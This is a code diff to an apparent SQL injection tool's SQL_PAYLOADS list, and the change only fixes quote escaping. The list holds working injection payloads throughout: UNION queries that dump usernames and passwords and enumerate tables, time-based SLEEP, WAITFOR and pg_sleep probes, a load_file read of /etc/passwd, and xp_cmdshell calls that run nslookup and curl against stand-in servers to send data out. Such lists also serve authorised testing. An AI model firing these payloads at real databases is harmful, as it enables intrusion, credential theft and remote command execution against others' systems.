@@ -49,8 +49,8 @@ SQL_PAYLOADS = [
     "' UNION SELECT null, username, password FROM users --",  
     '" UNION SELECT null, username, password FROM users --',  
     "' UNION SELECT null, group_concat(table_name), null FROM information_schema.tables --",  
-    '" UNION SELECT null, group_concat(column_name), null FROM information_schema.columns WHERE table_name = "users" --"',  
-    "' UNION SELECT null, group_concat(username, ':', password), null FROM users --",  
+    '" UNION SELECT null, group_concat(column_name), null FROM information_schema.columns WHERE table_name = \'users\' --"',  
+    "' UNION SELECT null, group_concat(username, \':\', password), null FROM users --",  
     "' UNION SELECT null, database(), null --",  
     '" UNION SELECT null, version(), null --",  
 
@@ -71,14 +71,14 @@ SQL_PAYLOADS = [
     '" AND SLEEP(5) --",  
     "' OR IF(1=1, SLEEP(5), 0) --",  
     '" OR IF(1=1, SLEEP(5), 0) --",  
-    "' AND 1=1 WAITFOR DELAY '00:00:05' --",  
-    '" AND 1=1 WAITFOR DELAY '00:00:05' --",  
+    "' AND 1=1 WAITFOR DELAY \'00:00:05\' --",  
+    '" AND 1=1 WAITFOR DELAY \'00:00:05\' --",  
     "'; SELECT pg_sleep(5) --",  
 
     # Out-of-Band (OOB) SQLi Payloads
-    "'; EXEC xp_cmdshell('nslookup your_custom_dns_server.com') --",  
+    "'; EXEC xp_cmdshell(\'nslookup your_custom_dns_server.com\') --",  
     '" OR 1=1 UNION SELECT null, load_file(\'/etc/passwd\') --",  
-    "'; EXEC xp_cmdshell('curl http://your_custom_server.com/data') --",  
+    "'; EXEC xp_cmdshell(\'curl http://your_custom_server.com/data\') --",  
     '" OR 1=1 UNION SELECT null, sys.eval(\'cmd\') --"',  
 
     # Second-Order SQLi Payloads
